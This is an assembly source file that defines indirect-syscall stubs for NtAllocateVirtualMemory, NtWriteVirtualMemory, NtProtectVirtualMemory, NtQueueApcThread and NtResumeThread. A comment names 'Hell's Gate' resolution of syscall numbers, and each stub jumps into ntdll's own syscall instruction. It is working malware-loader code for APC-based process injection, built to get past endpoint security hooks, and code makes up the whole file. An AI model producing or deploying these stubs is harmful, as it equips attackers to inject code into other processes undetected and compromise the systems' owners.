.intel_syntax noprefix

.global SysNtAllocateVirtualMemory
.global SysNtWriteVirtualMemory
.global SysNtProtectVirtualMemory
.global SysNtQueueApcThread
.global SysNtResumeThread

// SSN globals: written by resolve_hells_gate() at startup
.data
.global g_NtAllocSsn
.global g_NtWriteSsn
.global g_NtProtectSsn
.global g_NtQueueApcSsn
.global g_NtResumeSsn

g_NtAllocSsn:    .long 0
g_NtWriteSsn:    .long 0
g_NtProtectSsn:  .long 0
g_NtQueueApcSsn: .long 0
g_NtResumeSsn:   .long 0

// Gadget address globals: func+0x12 inside ntdll, where syscall instruction lives
.global g_NtAllocAddr
.global g_NtWriteAddr
.global g_NtProtectAddr
.global g_NtQueueApcAddr
.global g_NtResumeAddr

g_NtAllocAddr:    .quad 0
g_NtWriteAddr:    .quad 0
g_NtProtectAddr:  .quad 0
g_NtQueueApcAddr: .quad 0
g_NtResumeAddr:   .quad 0

.text

SysNtAllocateVirtualMemory:
    mov     r10, rcx
    mov     eax, dword ptr [rip + g_NtAllocSsn]
    jmp     qword ptr [rip + g_NtAllocAddr]

SysNtWriteVirtualMemory:
    mov     r10, rcx
    mov     eax, dword ptr [rip + g_NtWriteSsn]
    jmp     qword ptr [rip + g_NtWriteAddr]

SysNtProtectVirtualMemory:
    mov     r10, rcx
    mov     eax, dword ptr [rip + g_NtProtectSsn]
    jmp     qword ptr [rip + g_NtProtectAddr]

SysNtQueueApcThread:
    mov     r10, rcx
    mov     eax, dword ptr [rip + g_NtQueueApcSsn]
    jmp     qword ptr [rip + g_NtQueueApcAddr]

SysNtResumeThread:
    mov     r10, rcx
    mov     eax, dword ptr [rip + g_NtResumeSsn]
    jmp     qword ptr [rip + g_NtResumeAddr]
